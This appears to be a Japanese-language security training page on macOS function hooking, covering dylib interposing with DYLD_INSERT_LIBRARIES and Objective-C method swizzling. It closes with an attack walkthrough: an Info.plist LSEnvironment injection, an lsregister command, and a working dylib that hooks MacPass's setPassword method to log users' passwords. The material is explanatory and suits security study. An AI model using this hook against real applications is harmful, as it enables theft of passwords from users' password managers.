# macOS Function Hooking

{{#include ../../../banners/hacktricks-training.md}}

## Function Interposing

**`__interpose`** セクション（または **`S_INTERPOSING`** フラグが付けられたセクション）を含む **dylib** を作成し、**元の** 関数と **置き換え** 関数を参照する **関数ポインタ** のタプルを含めます。

次に、**`DYLD_INSERT_LIBRARIES`** を使用して dylib を **注入** します（インターポジングはメインアプリがロードされる前に行う必要があります）。明らかに、[**`DYLD_INSERT_LIBRARIES`** の使用に適用される **制限** はここにも適用されます](../macos-proces-abuse/macos-library-injection/#check-restrictions)。&#x20;

### Interpose printf

{{#tabs}}
{{#tab name="interpose.c"}}
```c:interpose.c
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{{#endtab}}

{{#tab name="hello.c"}}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{{#endtab}}

{{#tab name="interpose2.c"}}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{{#endtab}}
{{#endtabs}}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
## メソッドスワッピング

ObjectiveCでは、メソッドは次のように呼び出されます: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

**オブジェクト**、**メソッド**、および**パラメータ**が必要です。そして、メソッドが呼び出されると、**msgが送信されます**。これは関数**`objc_msgSend`**を使用します: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

オブジェクトは**`someObject`**、メソッドは**`@selector(method1p1:p2:)`**、引数は**value1**、**value2**です。

オブジェクト構造に従って、**メソッドの配列**にアクセスすることが可能で、そこには**名前**と**メソッドコードへのポインタ**が**格納されています**。

> [!CAUTION]
> メソッドとクラスは名前に基づいてアクセスされるため、この情報はバイナリに保存されます。したがって、`otool -ov </path/bin>`または[`class-dump </path/bin>`](https://github.com/nygard/class-dump)を使用して取得することが可能です。

### 生のメソッドへのアクセス

次の例のように、メソッドの名前、パラメータの数、アドレスなどの情報にアクセスすることが可能です:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### メソッドスワッピングと method_exchangeImplementations

関数 **`method_exchangeImplementations`** は **一つの関数の実装のアドレスを他の関数に変更する**ことを可能にします。

> [!CAUTION]
> したがって、関数が呼び出されると、**実行されるのは別の関数です**。
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
> [!WARNING]
> この場合、**正当な**メソッドの**実装コード**が**メソッド**の**名前**を**検証**すると、このスウィズリングを**検出**し、実行を防ぐことができます。
>
> 次の技術にはこの制限はありません。

### method_setImplementationによるメソッドスウィズリング

前の形式は奇妙です。なぜなら、2つのメソッドの実装を互いに変更しているからです。**`method_setImplementation`**関数を使用すると、**他のメソッドのためにメソッドの**実装を**変更**できます。

新しい実装から元の実装を呼び出す予定がある場合は、上書きする前に**元の実装のアドレスを保存する**ことを忘れないでください。後でそのアドレスを見つけるのは非常に複雑になります。
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## フッキング攻撃の方法論

このページでは、関数をフックするさまざまな方法について説明しました。しかし、これらは**攻撃のためにプロセス内でコードを実行する**ことを含んでいました。

そのために、最も簡単な技術は[環境変数を介してDyldを注入するか、ハイジャックすること](../macos-dyld-hijacking-and-dyld_insert_libraries.md)です。しかし、これは[ダイナミックライブラリプロセス注入](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port)を介しても行うことができると思います。

ただし、両方のオプションは**保護されていない**バイナリ/プロセスに**制限**されています。各技術を確認して、制限について詳しく学んでください。

ただし、関数フッキング攻撃は非常に特定のものであり、攻撃者は**プロセス内から機密情報を盗む**ためにこれを行います（そうでなければ、プロセス注入攻撃を行うだけです）。この機密情報は、MacPassなどのユーザーがダウンロードしたアプリに存在する可能性があります。

したがって、攻撃者のベクターは、脆弱性を見つけるか、アプリケーションの署名を剥がし、アプリケーションのInfo.plistを介して**`DYLD_INSERT_LIBRARIES`**環境変数を注入し、次のようなものを追加することになります：
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
そして、アプリケーションを**再登録**します：
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
そのライブラリに情報を抽出するためのフックコードを追加します: パスワード、メッセージ...

> [!CAUTION]
> 新しいバージョンのmacOSでは、アプリケーションバイナリの**署名を削除**すると、以前に実行されていた場合、macOSは**アプリケーションを実行しなくなります**。

#### ライブラリの例
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## 参考文献

- [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

{{#include ../../../banners/hacktricks-training.md}}
